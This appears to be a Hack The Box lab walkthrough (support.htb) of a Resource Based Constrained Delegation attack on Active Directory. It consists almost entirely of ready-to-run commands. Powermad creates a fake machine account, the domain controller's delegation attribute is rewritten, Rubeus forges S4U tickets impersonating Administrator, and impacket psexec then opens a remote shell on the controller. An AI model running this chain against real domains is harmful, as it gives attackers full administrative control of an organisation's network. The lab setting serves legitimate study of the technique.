```
################# Resource Based Constrained Delegation ###################

1. Let's check the value of the ms-ds-machineaccountquota attribute

Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota  ### Default is 10

2. Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty

Import-Module .\PowerView.ps1
Import-Module .\Powermad.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity  ### If value is empty that means we can proceed with the attack.

3. Now, let's create a fake computer and add it to the domain. We can use PowerMad's to achieve this.

New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

Get-ADComputer -identity FAKE-COMP01  ### Verify it created the computer

4. Now, lets set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module, which will in turn configure the msds allowedtoactonbehalfofotheridentity attribute on its own

Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$ 
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount   ### Verify the first command worked
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity     ### Verify the first command worked

5. First, let's grab the desired value and dump it to a variable called RawBytes

$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0

$Descriptor   ### Verrify the SecurityIdentifier is the SID of FAKE-COMP01 
$Descriptor.DiscretionaryAcl

######################## Performin a s4u attack ###########################

1. First, we will need the hash of the password that was used to create the computer object

.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

2. Next, we can generate Kerberos tickets for the Administrator.

.\rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /outfile:ticket.kirbi

3. Transfer the ticket and convert it with impacket.

ticketConverter.py ticket.kirbi ticket.ccache

4. Use the ticket with psexec.py

KRB5CCNAME=ticket.ccache Impacket-psexec.py support.htb/administrator@dc.support.htb -k -no-pass

-no-pass : no password
-k : Use kerberos auth
### Add the dc computer name, similar to the domain to the /etc/hosts file

```
